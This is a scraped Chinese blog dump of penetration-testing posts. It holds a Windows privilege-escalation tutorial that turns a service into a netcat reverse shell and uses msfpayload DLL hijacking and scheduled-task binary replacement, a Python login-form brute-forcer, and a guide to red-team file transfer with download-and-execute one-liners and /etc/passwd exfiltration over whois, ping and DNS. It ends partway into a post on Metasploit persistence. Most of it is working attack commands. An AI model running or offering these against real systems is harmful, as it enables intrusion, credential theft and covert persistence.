SERVICE_QUERY_STATUS SERVICE_QUERY_CONFIG SERVICE_INTERROGATE SERVICE_ENUMERATE_DEPENDENTS SERVICE_USER_DEFINED_CONTROL READ_CONTROL R BUILTIN\\Power Users SERVICE_QUERY_STATUS SERVICE_QUERY_CONFIG SERVICE_INTERROGATE SERVICE_ENUMERATE_DEPENDENTS SERVICE_START SERVICE_USER_DEFINED_CONTROL READ_CONTROL RW BUILTIN\\Administrators SERVICE_ALL_ACCESS RW NT AUTHORITY\\SYSTEM SERVICE_ALL_ACCESS Accesschk可以自动检查我们是否具有对具有特定用户级别的Windows服务的写访问权。通常作为低权限用户，我们将要检查“Authenticated Users”。确保检查您的用户所属的用户组，例如“Power Users”被视为低权限用户组（尽管它没有被广泛使用）。 让我们比较Windows 8和Windows XP SP0上的输出。 This is on Windows 8.C:\\Users\\b33f\\tools\\Sysinternals&gt; accesschk.exe -uwcqv “Authenticated Users” *No matching objects found. On a default Windows XP SP0 we can see there is a pretty big security fail.C:> accesschk.exe -uwcqv “Authenticated Users” *RW SSDPSRV SERVICE_ALL_ACCESSRW upnphost SERVICE_ALL_ACCESS C:> accesschk.exe -ucqv SSDPSRV SSDPSRV RW NT AUTHORITY\\SYSTEM SERVICE_ALL_ACCESS RW BUILTIN\\Administrators SERVICE_ALL_ACCESS RW NT AUTHORITY\\Authenticated Users SERVICE_ALL_ACCESS RW BUILTIN\\Power Users SERVICE_ALL_ACCESS RW NT AUTHORITY\\LOCAL SERVICE SERVICE_ALL_ACCESS C:> accesschk.exe -ucqv upnphost upnphost RW NT AUTHORITY\\SYSTEM SERVICE_ALL_ACCESS RW BUILTIN\\Administrators SERVICE_ALL_ACCESS RW NT AUTHORITY\\Authenticated Users SERVICE_ALL_ACCESS RW BUILTIN\\Power Users SERVICE_ALL_ACCESS RW NT AUTHORITY\\LOCAL SERVICE SERVICE_ALL_ACCESS 此问题后来通过引入XP SP2解决，但是在SP0和SP1上，它可以用作通用本地权限提升漏洞。通过重新配置服务，我们可以让它以SYSTEM级别权限运行我们选择的任何二进制文件。 我们来看看这是如何在实践中完成的。在这种情况下，服务将执行netcat并打开具有SYSTEM级别权限的反向shell。其他选择当然是可能的。 C:> sc qc upnphost [SC] GetServiceConfig SUCCESS SERVICE_NAME: upnphost TYPE : 20 WIN32_SHARE_PROCESS START_TYPE : 3 DEMAND_START ERROR_CONTROL : 1 NORMAL BINARY_PATH_NAME : C:\\WINDOWS\\System32\\svchost.exe -k LocalService LOAD_ORDER_GROUP : TAG : 0 DISPLAY_NAME : Universal Plug and Play Device Host DEPENDENCIES : SSDPSRV SERVICE_START_NAME : NT AUTHORITY\\LocalService C:> sc config upnphost binpath= “C:\\nc.exe -nv 127.0.0.1 9988 -e C:\\WINDOWS\\System32\\cmd.exe”[SC] ChangeServiceConfig SUCCESS C:> sc config upnphost obj= “.\\LocalSystem” password= “”[SC] ChangeServiceConfig SUCCESS C:> sc qc upnphost [SC] GetServiceConfig SUCCESS SERVICE_NAME: upnphost TYPE : 20 WIN32_SHARE_PROCESS START_TYPE : 3 DEMAND_START ERROR_CONTROL : 1 NORMAL BINARY_PATH_NAME : C:\\nc.exe -nv 127.0.0.1 9988 -e C:\\WINDOWS\\System32\\cmd.exe LOAD_ORDER_GROUP : TAG : 0 DISPLAY_NAME : Universal Plug and Play Device Host DEPENDENCIES : SSDPSRV SERVICE_START_NAME : LocalSystem C:> net start upnphost ![img](http://www.fuzzysecurity.com/tutorials/images/priv01_big.png) Service Shell (upnphost) 即使配置不正确，我们也不会始终拥有对服务的完全访问权限。下图来自Brett Moore关于Windows权限升级的演示文稿，这些访问权限中的任何一个都将为我们提供一个SYSTEM shell。 ![img](http://www.fuzzysecurity.com/tutorials/images/priv02_big.png) 需要记住的重要一点是，我们会发现我们的受感染会话所属的用户组。如前所述，“Power Users”也被视为低权限用户组。“Power Users”有各自的漏洞，Mark Russinovich写了一篇关于这个主题的非常有趣的文章。 Power in Power用户（Mark Russinovich） - [这里](http://blogs.technet.com/b/markrussinovich/archive/2006/05/01/the-power-in-power-users.aspx) 最后我们将检查文件/文件夹权限，如果我们不能直接攻击操作系统，我们将让操作系统完成所有的工作。这里有很多内容，所以我将向您展示两种权限漏洞以及如何利用它们。一旦掌握了总体思路，您就可以将这些技术应用于其他情境。 对于我们的第一个例子，我们将复制Parvez从GreyHatHacker写的一篇文章的结果; “通过利用弱文件夹权限提升权限”。这是一个很好的特权升级写作，我强烈建议你[在这里](http://www.greyhathacker.net/?p=738)阅读他的帖子。 此示例是DLL劫持的特例。程序通常不能自己运行，它们需要很多资源（大多数是DLL，但也有专有文件）。如果程序或服务从我们具有写访问权限的目录加载文件，我们可以滥用它来弹出具有程序运行权限的shell。 通常，Windows应用程序将使用预定义的搜索路径来查找DLL，并且它将按特定顺序检查这些路径。DLL劫持通常是通过将恶意DLL放在其中一个路径中，同时确保在合法DLL之前找到DLL来实现的。通过让应用程序指定它所需的DLL的绝对路径，可以减轻此问题。 您可以在以下32位系统上看到DLL搜索顺序： 1 - 应用程序加载的目录 2 - 32位系统目录（C：\\ Windows \\ System32） 3 - 16位系统目录（C：\\ Windows \\ System） 4 - Windows目录（C：\\ Windows） 5 - 当前工作目录（CWD） 6 - PATH环境变量中的目录（系统然后用户） 有时会发生应用程序尝试加载机器上不存在的DLL。这可能由于多种原因而发生，例如，如果仅对某些插件或未安装的功能需要DLL。在这种情况下，Parvez发现某些Windows服务尝试加载默认安装中不存在的DLL。 由于有问题的DLL不存在，我们将最终遍历所有搜索路径。作为一个低权限用户，我们没有希望将恶意DLL放入1-4中，在这种情况下不可能出现这种情况，因为我们讨论的是Windows服务但是如果我们对Windows PATH中的任何目录都有写访问权限我们赢了。 让我们看看它在实践中是如何工作的，对于我们的示例，我们将使用试图加载wlbsctrl.dll的IKEEXT（IKE和AuthIP IPsec Keying Modules）服务。 This is on Windows 7 as low privilege user1.C:\\Users\\user1\\Desktop&gt; echo %username% user1 We have a win here since any non-default directory in “C:\\” will give write access to authenticatedusers. C:\\Users\\user1\\Desktop&gt; echo %path% C:\\Windows\\system32;C:\\Windows;C:\\Windows\\System32\\Wbem;C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\;C:\\Program Files\\OpenVPN\\bin;C:\\Python27 We can check our access permissions with accesschk or cacls.C:\\Users\\user1\\Desktop&gt; accesschk.exe -dqv “C:\\Python27” C:\\Python27 Medium Mandatory Level (Default) [No-Write-Up] RW BUILTIN\\Administrators FILE_ALL_ACCESS RW NT AUTHORITY\\SYSTEM FILE_ALL_ACCESS R BUILTIN\\Users FILE_LIST_DIRECTORY FILE_READ_ATTRIBUTES FILE_READ_EA FILE_TRAVERSE SYNCHRONIZE READ_CONTROL RW NT AUTHORITY\\Authenticated Users FILE_ADD_FILE FILE_ADD_SUBDIRECTORY FILE_LIST_DIRECTORY FILE_READ_ATTRIBUTES FILE_READ_EA FILE_TRAVERSE FILE_WRITE_ATTRIBUTES FILE_WRITE_EA DELETE SYNCHRONIZE READ_CONTROL C:\\Users\\user1\\Desktop&gt; cacls “C:\\Python27” C:\\Python27 BUILTIN\\Administrators:(ID)F BUILTIN\\Administrators:(OI)(CI)(IO)(ID)F NT AUTHORITY\\SYSTEM:(ID)F NT AUTHORITY\\SYSTEM:(OI)(CI)(IO)(ID)F BUILTIN\\Users:(OI)(CI)(ID)R NT AUTHORITY\\Authenticated Users:(ID)C NT AUTHORITY\\Authenticated Users:(OI)(CI)(IO)(ID)C Before we go over to action we need to check the status of the IKEEXT service. In this case we can seeit is set to “AUTO_START” so it will launch on boot! C:\\Users\\user1\\Desktop&gt; sc qc IKEEXT [SC] QueryServiceConfig SUCCESS SERVICE_NAME: IKEEXT TYPE : 20 WIN32_SHARE_PROCESS START_TYPE : 2 AUTO_START ERROR_CONTROL : 1 NORMAL BINARY_PATH_NAME : C:\\Windows\\system32\\svchost.exe -k netsvcs LOAD_ORDER_GROUP : TAG : 0 DISPLAY_NAME : IKE and AuthIP IPsec Keying Modules DEPENDENCIES : BFE SERVICE_START_NAME : LocalSystem 现在我们知道满足必要条件我们可以生成恶意DLL并弹出shell！ root@darkside:~# msfpayload windows/shell_reverse_tcp lhost=’127.0.0.1’ lport=’9988’ O Name: Windows Command Shell, Reverse TCP Inline Module: payload/windows/shell_reverse_tcp Platform: Windows Arch: x86Needs Admin: No Total size: 314 Rank: Normal Provided by: vlad902 &#x76;&#108;&#97;&#100;&#57;&#48;&#50;&#64;&#x67;&#109;&#97;&#105;&#x6c;&#46;&#x63;&#x6f;&#109; sf &#x73;&#116;&#101;&#x70;&#104;&#101;&#110;&#x5f;&#x66;&#x65;&#119;&#x65;&#114;&#x40;&#x68;&#97;&#x72;&#109;&#111;&#110;&#121;&#115;&#101;&#x63;&#x75;&#114;&#x69;&#116;&#121;&#46;&#99;&#111;&#x6d; Basic options:Name Current Setting Required Description EXITFUNC process yes Exit technique: seh, thread, process, noneLHOST 127.0.0.1 yes The listen addressLPORT 9988 yes The listen port Description: Connect back to attacker and spawn a command shell root@darkside:~# msfpayload windows/shell_reverse_tcp lhost=’127.0.0.1’ lport=’9988’ D &gt;/root/Desktop/evil.dll Created by msfpayload (http://www.metasploit.com).Payload: windows/shell_reverse_tcp Length: 314Options: {“lhost”=&gt;”127.0.0.1”, “lport”=&gt;”9988”} 将DLL传输到目标机器后，我们需要做的就是将其重命名为wlbsctrl.dll并将其移动到“C:\\Python27”。一旦完成，我们需要耐心地等待机器重新启动（或者我们可以尝试强制重启），我们将获得一个SYSTEM shell。 Again, this is as low privilege user1.C:\\Users\\user1\\Desktop&gt; dir Volume in drive C has no label. Volume Serial Number is 948D-A98F Directory of C:\\Users\\user1\\Desktop 02/18/2014 01:49 PM .02/18/2014 01:49 PM ..04/22/2013 09:39 AM 331,888 accesschk.exe02/18/2014 12:38 PM 14,336 evil.dll01/25/2014 12:46 AM 36,864 fubar.exe01/22/2014 08:17 AM incognito206/30/2011 01:52 PM 1,667,584 ncat.exe11/22/2013 07:39 PM 1,225 wmic_info.bat 5 File(s) 2,051,897 bytes 3 Dir(s) 73,052,160 bytes free C:\\Users\\user1\\Desktop&gt; copy evil.dll C:\\Python27\\wlbsctrl.dll 1 file(s) copied. C:\\Users\\user1\\Desktop&gt; dir C:\\Python27 Volume in drive C has no label. Volume Serial Number is 948D-A98F Directory of C:\\Python27 02/18/2014 01:53 PM .02/18/2014 01:53 PM ..10/20/2012 02:52 AM DLLs10/20/2012 02:52 AM Doc10/20/2012 02:52 AM include01/28/2014 03:45 AM Lib10/20/2012 02:52 AM libs04/10/2012 11:34 PM 40,092 LICENSE.txt04/10/2012 11:18 PM 310,875 NEWS.txt04/10/2012 11:31 PM 26,624 python.exe04/10/2012 11:31 PM 27,136 pythonw.exe04/10/2012 11:18 PM 54,973 README.txt10/20/2012 02:52 AM tcl10/20/2012 02:52 AM Tools04/10/2012 11:31 PM 49,664 w9xpopen.exe02/18/2014 12:38 PM 14,336 wlbsctrl.dll 7 File(s) 523,700 bytes 9 Dir(s) 73,035,776 bytes free 一切都已设置，我们现在需要做的就是等待系统重启。出于演示目的，我在下面包含了一个屏幕截图，我使用管理员命令提示符手动重启服务。 [![img](http://www.fuzzysecurity.com/tutorials/images/priv03_big.png) Service Shell (IKEEXT) 对于我们的最后一个例子，我们将查看计划的任务。回顾我们之前收集的结果，我们遇到了以下条目。 HostName: B33FTaskName: \\LogGrabberTFTPNext Run Time: 2/19/2014 9:00:00 AMStatus: ReadyLogon Mode: Interactive/BackgroundLast Run Time: N/ALast Result: 1Author: B33F\\b33fTask To Run: E:\\GrabLogs\\tftp.exe 10.1.1.99 GET log.out E:\\GrabLogs\\Logs\\log.txtStart In: N/AComment: N/AScheduled Task State: EnabledIdle Time: DisabledPower Management: Stop On Battery Mode, No Start On BatteriesRun As User: SYSTEMDelete Task If Not Rescheduled: EnabledStop Task If Runs X Hours and X Mins: 72:00:00Schedule: Scheduling data is not available in this format.Schedule Type: DailyStart Time: 9:00:00 AMStart Date: 2/17/2014End Date: N/ADays: Every 1 day(s)Months: N/ARepeat: Every: DisabledRepeat: Until: Time: DisabledRepeat: Until: Duration: DisabledRepeat: Stop If Still Running: Disabled 盒子上似乎有一个TFTP客户端连接到远程主机并抓取某种日志文件。我们可以看到此任务每天上午9点运行，并以SYSTEM级别权限（ouch）运行。让我们看看我们是否具有对此文件夹的写入权限。 C:\\Users\\user1\\Desktop&gt; accesschk.exe -dqv “E:\\GrabLogs” E:\\GrabLogs Medium Mandatory Level (Default) [No-Write-Up] RW BUILTIN\\Administrators FILE_ALL_ACCESS RW NT AUTHORITY\\SYSTEM FILE_ALL_ACCESS RW NT AUTHORITY\\Authenticated Users FILE_ADD_FILE FILE_ADD_SUBDIRECTORY FILE_LIST_DIRECTORY FILE_READ_ATTRIBUTES FILE_READ_EA FILE_TRAVERSE FILE_WRITE_ATTRIBUTES FILE_WRITE_EA DELETE SYNCHRONIZE READ_CONTROL R BUILTIN\\Users FILE_LIST_DIRECTORY FILE_READ_ATTRIBUTES FILE_READ_EA FILE_TRAVERSE SYNCHRONIZE READ_CONTROL C:\\Users\\user1\\Desktop&gt; dir “E:\\GrabLogs” Volume in drive E is More Volume Serial Number is FD53-2F00 Directory of E:\\GrabLogs 02/18/2014 11:34 PM .02/18/2014 11:34 PM ..02/18/2014 11:34 PM Logs02/18/2014 09:21 PM 180,736 tftp.exe 1 File(s) 180,736 bytes 3 Dir(s) 5,454,602,240 bytes free 显然，这是一个严重的配置问题，不需要将此任务作为SYSTEM运行，但更糟糕的是任何经过身份验证的用户都具有对该文件夹的写入权限。理想情况下，我会抓住TFTP客户端，后备PE可执行文件，同时确保它仍能完美运行，然后将其放回目标计算机上。但是，出于本示例的目的，我们可以使用metasploit生成的可执行文件简单地覆盖二进制文件。 root@darkside:~# msfpayload windows/shell_reverse_tcp lhost=’127.0.0.1’ lport=’9988’ O Name: Windows Command Shell, Reverse TCP Inline Module: payload/windows/shell_reverse_tcp Platform: Windows Arch: x86Needs Admin: No Total size: 314 Rank: Normal Provided by: vlad902 &#x76;&#108;&#97;&#100;&#57;&#x30;&#x32;&#x40;&#103;&#x6d;&#97;&#105;&#x6c;&#x2e;&#99;&#111;&#x6d; sf &#x73;&#x74;&#101;&#x70;&#x68;&#101;&#110;&#95;&#102;&#101;&#x77;&#101;&#114;&#64;&#104;&#x61;&#x72;&#x6d;&#111;&#x6e;&#x79;&#x73;&#101;&#x63;&#x75;&#x72;&#105;&#x74;&#121;&#x2e;&#99;&#x6f;&#x6d; Basic options:Name Current Setting Required Description EXITFUNC process yes Exit technique: seh, thread, process, noneLHOST 127.0.0.1 yes The listen addressLPORT 9988 yes The listen port Description: Connect back to attacker and spawn a command shell root@darkside:~# msfpayload windows/shell_reverse_tcp lhost=’127.0.0.1’ lport=’9988’ R | msfencode -texe &gt; /root/Desktop/evil-tftp.exe [*] x86/shikata_ga_nai succeeded with size 341 (iteration=1) 现在剩下的就是上传我们的恶意可执行文件并覆盖“E：\\ GrabLogs \\ tftp.exe”。一旦完成，我们可以在早上睡个好觉，然后在早上醒来。这里要记住的一件重要事情是我们检查我们试图妥协的盒子上的时间/时区。 C:\\Users\\user1\\Desktop&gt; dir Volume in drive C has no label. Volume Serial Number is 948D-A98F Directory of C:\\Users\\user1\\Desktop 02/19/2014 01:36 AM .02/19/2014 01:36 AM ..04/22/2013 09:39 AM 331,888 accesschk.exe02/19/2014 01:31 AM 73,802 evil-tftp.exe01/25/2014 12:46 AM 36,864 fubar.exe01/22/2014 08:17 AM incognito206/30/2011 01:52 PM 1,667,584 ncat.exe02/18/2014 12:38 PM 14,336 wlbsctrl.dll11/22/2013 07:39 PM 1,225 wmic_info.bat 6 File(s) 2,125,699 bytes 3 Dir(s) 75,341,824 bytes free C:\\Users\\user1\\Desktop&gt; copy evil-tftp.exe E:\\GrabLogs\\tftp.exe Overwrite E:\\GrabLogs\\tftp.exe? (Yes/No/All): Yes 1 file(s) copied. 为了演示此操作中的权限提升，我快速转发了系统时间。从下面的屏幕截图中我们可以看到我们在上午9点迅速提供了我们的SYSTEM shell。 ![img](http://www.fuzzysecurity.com/tutorials/images/priv04_big.png) Schtasks Shell (LogGrabberTFTP) 这两个示例应该让您了解在考虑文件/文件夹权限时我们需要查找的漏洞类型。您需要花时间检查Windows服务，计划任务和启动任务的所有bin路径。 我们已经能够看到accesschk是这里的首选工具。在结束之前，我想给你一些关于使用accesschk的最后一点。 When executing any of the sysinternals tools for the first time the user will be presented with a GUIpop-up to accept the EULA. This is obviously a big problem, however we can add an extra command line flagto automatically accept the EULA. accesschk.exe /accepteula … … … Find all weak folder permissions per drive.accesschk.exe -uwdqs Users c:\\accesschk.exe -uwdqs “Authenticated Users” c:\\ Find all weak file permissions per drive.accesschk.exe -uwqs Users c:*.accesschk.exe -uwqs “Authenticated Users” c:\\.* ` Final Thoughts 本指南旨在成为Windows权限升级的“基础”。如果你想真正掌握这门课程，你需要投入大量的工作和研究。与测试的所有方面一样，枚举是关键，你对目标的了解越多，你拥有的攻击途径越多，成功率就越高。 另请注意，您有时可能会将您的权限提升为管理员。从管理员升级到SYSTEM的权限不是问题，您始终可以重新配置服务或创建具有SYSTEM级别权限的计划任务。 现在出去弹出SYSTEM !!","categories":[],"tags":[{"name":"渗透测试","slug":"渗透测试","permalink":"/tags/渗透测试/"}]},{"title":"python遍历路径破解表单","slug":"python遍历路径破解表单","date":"2019-03-12T02:35:27.000Z","updated":"2019-03-12T02:53:37.017Z","comments":true,"path":"2019/03/python遍历路径破解表单/","link":"","permalink":"/2019/03/python遍历路径破解表单/","excerpt":"","text":"python遍历路径破解表单​ 首先是利用python遍历路径，采用字典爆破的形式，当然如果只是单纯的爆破路径，简单写一个多线程脚本就行了。这里考虑如何对爆破到的路径进行第二步利用，此处尝试对猜解到的路径进行表单发现及登陆爆破处理。 ​ 首先就是路径爆破，采用多线程队列，爆破路径，判断形式为200响应码。 while not self._queue.empty(): queue = self._queue.get(timeout=0.5) try: r = requests.get(self.url+queue,timeout=5, headers=self.headers) if r.status_code == 200: print &quot;[200] %s&quot; %(queue) soup = BeautifulSoup(r.content,&#39;html.parser&#39;) if soup.find(&#39;form&#39;): self.brute(soup, queue) 猜解到路径后交给brute方法处理，方法实现了一个css选择器，获取form表单中的input字段标签，提取标签参数组合成post参数值，然后提取表单中的action跳转页面，如没有页面默认在当前表单页提交。 input = soup.select(&quot;form input&quot;) for i in input: try: if i.attrs[&#39;type&#39;] == &quot;hidden&quot;: name, value = i.attrs[&#39;name&#39;], i.attrs[&#39;value&#39;] list_post.append(name+&#39;=&#39;+value) elif i.attrs[&#39;type&#39;] == &#39;password&#39;: name = i.attrs[&#39;name&#39;] list_post.append(name+&#39;=$$$&#39;) else: name = i.attrs[&#39;name&#39;] list_post.append(name+&#39;=%%%&#39;) except: continue for i in list_post: post = post + i + &#39;&amp;&#39; action = soup.find_all(&#39;form&#39;) for i in action: if i[&#39;action&#39;]: actiontag = i[&#39;action&#39;] else: actiontag = queue self.payload(post, actiontag) 获取参数值后，交给payload方法处理登陆，采用requests库的session登陆。获取cookie，先采用session请求获取cookie后，再采用session携带cookie进行请求提交。然后对输入的验证值进行判断是否为登陆成功。 for name in self.username(): post_user = post.replace(&#39;%%%&#39;,name.strip()) for pwd in self.password(): post_pwd = post_user.replace(&#39;$$$&#39;,pwd.strip()) session = requests.Session() session.get(self.url+&#39;/&#39;+action, headers=self.headers, verify=False) r = session.post(self.url+&#39;/&#39;+action, data=post_pwd, headers=self.headers, verify=False) if self.word in r.content: print &#39;[username] %s&#39; %name +&#39;\\r&#39; + &#39;[password] %s&#39; %pwd return 为了判断是否登陆成功，采用的人为输入判断字符串的形式。也就是脚本执行形式为 python xxx.py http://xxxx.com xxxxx","categories":[],"tags":[{"name":"python","slug":"python","permalink":"/tags/python/"}]},{"title":"红队后渗透测试中的文件传输技巧","slug":"红队后渗透测试中的文件传输技巧","date":"2019-03-08T01:25:06.000Z","updated":"2019-03-08T01:40:57.034Z","comments":true,"path":"2019/03/红队后渗透测试中的文件传输技巧/","link":"","permalink":"/2019/03/红队后渗透测试中的文件传输技巧/","excerpt":"","text":"原文链接：https://xax007.github.io/2019-01-13-post-exploitation-file-transfer-tips/ 在红队渗透测试当中往往需要最大化利用当前的环境绕过重兵防守的系统的防火墙、IDS、IPS等报警和监控系统进行文件传输，本文列出了多种利用操作系统默认自带的工具进行文件传输的方法。 搭建 HTTP serverPythonpython2: python -m SimpleHTTPServer 1337 以上命令会在当前目录启动 HTTP 服务，端口为 1337 python3: python -m http.server 1337 以上命令会在当前目录启动 HTTP 服务，端口为 1337 PHP 5.4+当 PHP 版本大于 5.4 是，可使用 PHP 在当前目录启动 HTTP 服务，端口为 1337 php -S 0.0.0.0:1337 Ruby下面的命令会在当前目录下启动 HTTP 服务，端口为 1337 ruby -rwebrick -e&#39;WEBrick::HTTPServer.new(:Port =&gt; 1337, :DocumentRoot =&gt; Dir.pwd).start&#39; Ruby 1.9.2+ruby -run -e httpd . -p 1337 Perlperl -MHTTP::Server::Brick -e &#39;$s=HTTP::Server::Brick-&gt;new(port=&gt;1337); $s-&gt;mount(&quot;/&quot;=&gt;{path=&gt;&quot;.&quot;}); $s-&gt;start&#39; perl -MIO::All -e &#39;io(&quot;:8080&quot;)-&gt;fork-&gt;accept-&gt;(sub { $_[0] &lt; io(-x $1 +? &quot;./$1 |&quot; : $1) if /^GET \\/(.*) / })&#39; Thanks to: http://stackoverflow.com/questions/8058793/single-line-python-webserver busybox httpdbusybox httpd -f -p 8000 本条来自:lvm 从 HTTP server 下载文件以下列出了在 Windows 和 Linux 系统下使用系统自带工具从 HTTP Server 下载文件的几种方法 Windowspowershell下载并执行: powershell (new-object System.Net.WebClient).DownloadFile(&#39;http://1.2.3.4/5.exe&#39;,&#39;c:\\download\\a.exe&#39;);start-process &#39;c:\\download\\a.exe&#39; certutil下载并执行: certutil -urlcache -split -f http://1.2.3.4/5.exe c:\\download\\a.exe&amp;&amp;c:\\download\\a.exe bitsadmin下载并执行: bitsadmin /transfer n http://1.2.3.4/5.exe c:\\download\\a.exe &amp;&amp; c:\\download\\a.exe ⚠️ bitsadmin 的下载速度比较慢 regsvr32regsvr32 /u /s /i:http://1.2.3.4/5.exe scrobj.dll LinuxCurlcurl http://1.2.3.4/backdoor Wgetwget http://1.2.3.4/backdoor awk在使用 awk 进行下载文件时，首先使用以上列出的任意一条命令启动一个 HTTP Server awk &#39;BEGIN { RS = ORS = &quot;\\r\\n&quot; HTTPCon = &quot;/inet/tcp/0/127.0.0.1/1337&quot; print &quot;GET /secret.txt HTTP/1.1\\r\\nConnection: close\\r\\n&quot; |&amp; HTTPCon while (HTTPCon |&amp; getline &gt; 0) print $0 close(HTTPCon) }&#39; 效果： Setup HTTP PUT server以下列出了上传文件到 HTTP Server 的几种方法 使用 Nginx 搭建 HTTP PUT Servermkdir -p /var/www/upload/ # 创建目录 chown www-data:www-data /var/www/upload/ # 修改目录所属用户和组 cd /etc/nginx/sites-available # 进入 nginx 虚拟主机目录 # 写入配置到 file_upload 文件 cat &lt;&lt;EOF &gt; file_upload server { listen 8001 default_server; server_name kali; location / { root /var/www/upload; dav_methods PUT; } } EOF # 写入完毕 cd ../sites-enable # 进入 nginx 虚拟主机启动目录 ln -s /etc/nginx/sites-available/file_upload file_upload # 启用 file_upload 虚拟主机 systemctl start nginx # 启动 Nginx 使用 Python 搭建 HTTP PUT Server以下代码保存到 HTTPutServer.py 文件里: # ref: https://www.snip2code.com/Snippet/905666/Python-HTTP-PUT-test-server import sys import signal from threading import Thread from BaseHTTPServer import HTTPServer, BaseHTTPRequestHandler class PUTHandler(BaseHTTPRequestHandler): def do_PUT(self): length = int(self.headers[&#39;Content-Length&#39;]) content = self.rfile.read(length) self.send_response(200) with open(self.path[1:], &quot;w&quot;) as f: f.write(content) def run_on(port): print(&quot;Starting a HTTP PUT Server on {0} port {1} (http://{0}:{1}) ...&quot;.format(sys.argv[1], port)) server_address = (sys.argv[1], port) httpd = HTTPServer(server_address, PUTHandler) httpd.serve_forever() if __name__ == &quot;__main__&quot;: if len(sys.argv) &lt; 3: print(&quot;Usage:\\n\\tpython {0} ip 1337&quot;.format(sys.argv[0])) sys.exit(1) ports = [int(arg) for arg in sys.argv[2:]] try: for port_number in ports: server = Thread(target=run_on, args=[port_number]) server.daemon = True # Do not make us wait for you to exit server.start() signal.pause() # Wait for interrupt signal, e.g. KeyboardInterrupt except KeyboardInterrupt: print &quot;\\nPython HTTP PUT Server Stoped.&quot; sys.exit(1) 运行方法: $ python HTTPutServer.py 10.10.10.100 1337 Starting a HTTP PUT Server on 10.10.10.100 port 1337 (http://10.10.10.100:1337) ... 上传文件到 HTTP PUT serverLinuxCurl$ curl --upload-file secret.txt http://ip:port/ Wget$ wget --method=PUT --post-file=secret.txt http://ip:port/ WindowsPowershell$body = Get-Content secret.txt Invoke-RestMethod -Uri http://ip:port/secret.txt -Method PUT -Body $body 使用 Bash /dev/tcp 进行文件传输首先需要监听端口 接收端: nc -lvnp 1337 &gt; secret.txt 发送端: cat secret.txt &gt; /dev/tcp/ip/port 使用 SMB 协议进行文件传输搭建简易 SMB Server搭建简易SMB Server 需要用到 Impacket 项目的 smbserver.py 文件 Impacket 已默认安装在 Kali Linux 系统中 syntax: impacker-smbserver ShareName SharePath $ mkdir smb # 创建 smb 目录 $ cd smb # 进入 smb目录 $ impacket-smbserver share `pwd` # 在当前目录启动 SMB server，共享名称为 share 效果： 从 SMB server 下载文件copy \\\\IP\\ShareName\\file.exe file.exe 上传文件到 SMB servernet use x: \\\\IP\\ShareName copy file.txt x: net use x: /delete 使用 whois 命令进行文件传输graph LR A[Host A] – /etc/passwd –&gt; B[Host B] 接收端 Host B： nc -vlnp 1337 | sed &quot;s/ //g&quot; | base64 -d 发送端 Host A： whois -h 127.0.0.1 -p 1337 `cat /etc/passwd | base64` 效果： 使用 ping 命令进行文件传输graph LR A[Sender] – secret.txt –&gt; B[Reciver] 发送端: xxd -p -c 4 secret.txt | while read line; do ping -c 1 -p $line ip; done 接收端: 以下代码保存到 ping_receiver.py import sys try: from scapy.all import * except: print(&quot;Scapy not found, please install scapy: pip install scapy&quot;) sys.exit(0) def process_packet(pkt): if pkt.haslayer(ICMP): if pkt[ICMP].type == 8: data = pkt[ICMP].load[-4:] print(f&#39;{data.decode(&quot;utf-8&quot;)}&#39;, flush=True, end=&quot;&quot;, sep=&quot;&quot;) sniff(iface=&quot;eth0&quot;, prn=process_packet) 执行方法: python3 ping_receiver.py 效果 使用 dig 命令进行文件传输graph LR A[Sender] – /etc/passwd –&gt; B[Reciver] 发送端: xxd -p -c 31 /etc/passwd | while read line; do dig @172.16.1.100 +short +tries=1 +time=1 $line.gooogle.com; done 接收端: 以下代码使用了 python 的 scapy 模块，需要手动安装 代码保存到 dns_reciver.py 文件中 try: from scapy.all import * except: print(&quot;Scapy not found, please install scapy: pip install scapy&quot;) def process_packet(pkt): if pkt.haslayer(DNS): domain = pkt[DNS][DNSQR].qname.decode(&#39;utf-8&#39;) root_domain = domain.split(&#39;.&#39;)[1] if root_domain.startswith(&#39;gooogle&#39;): print(f&#39;{bytearray.fromhex(domain[:-13]).decode(&quot;utf-8&quot;)}&#39;, flush=True, end=&#39;&#39;) sniff(iface=&quot;eth0&quot;, prn=process_packet) 运行方法: python3 dns_reciver.py 效果： 使用 NetCat 进行文件传输graph LR Sender[A:10.10.10.100] – 1.txt –&gt; Reciver[B:10.10.10.200] 接受端: nc -l -p 1337 &gt; 1.txt 发送端： cat 1.txt | nc -l -p 1337 或者 nc 10.10.10.200 1337 &lt; 1.txt 在极端环境下，如果接受端没有 nc 可以使用 Bash 的 /dev/tcp 接收文件: cat &lt; /dev/tcp/10.10.10.200/1337 &gt; 1.txt","categories":[],"tags":[{"name":"web安全","slug":"web安全","permalink":"/tags/web安全/"}]},{"title":"渗透之权限维持","slug":"渗透之权限维持","date":"2019-03-08T01:24:46.000Z","updated":"2019-03-08T01:40:48.490Z","comments":true,"path":"2019/03/渗透之权限维持/","link":"","permalink":"/2019/03/渗透之权限维持/","excerpt":"","text":"原文链接：渗透之权限维持杂谈 0x01 MSFpersistence msf内置的后渗透权限维持工具persistence Metsvc它是通过在已经获得shell的目标主机上开启了一个服务来提供后门的功能。run Metsvc -h Scheduleme &amp; Schtasksabusemsf中自动利用计划任务的后门程序，后面会聊到linux和windows平台的计划任务。 run scheduleme -h # 例子：上传nc并创建计划任务每一分钟执行一次 &#39;nc -e cmd.exe -L -p 8080&#39; run scheduleme -m 1 -e /tmp/nc.exe -o &quot;-e cmd.exe -L -p 8080&quot; run Schtasksabuse -h # 例子：每隔4秒执行一次calc.exe run schtasksabuse -t 192.168.2.7 -c &quot;cmd /c calc.exe&quot; -d 4 Mof_ps_persist 现在已经找不到这个利用模块，参考：https://github.com/khr0x40sh/metasploit-modules/blob/master/persistence/mof_ps_persist.rb Autorunscript获取shell的时候自动执行持续化脚本,可以被Autorunscript执行的命令目录在metasploit/scripts/meterpreter # persistence use exploit/multi/handler set PAYLOAD windows/meterpreter/reverse_tcp set LHOST 192.168.2.101 set LPORT 5555 set ExitOnSession false set AutoRunScript persistence -r 192.168.2.101 -p 5556 -U -X -i 30 exploit # metsvc use exploit/multi/handler set PAYLOAD windows/meterpreter/reverse_tcp set LHOST 192.168.2.101 set LPORT 5555 set ExitOnSession false set AutoRunScript metsvc -A exploit 0x02 计划任务无论是windows还是linux操作系统都提供计划任务功能，来实现定时或者周期性的执行一些指令。自然而然我们可以在计划任务中做手脚，埋后门。 windows 图形化工具：taskschd.msc 命令行工具：schtasks.exe SCHTASKS /parameter [arguments] 描述: 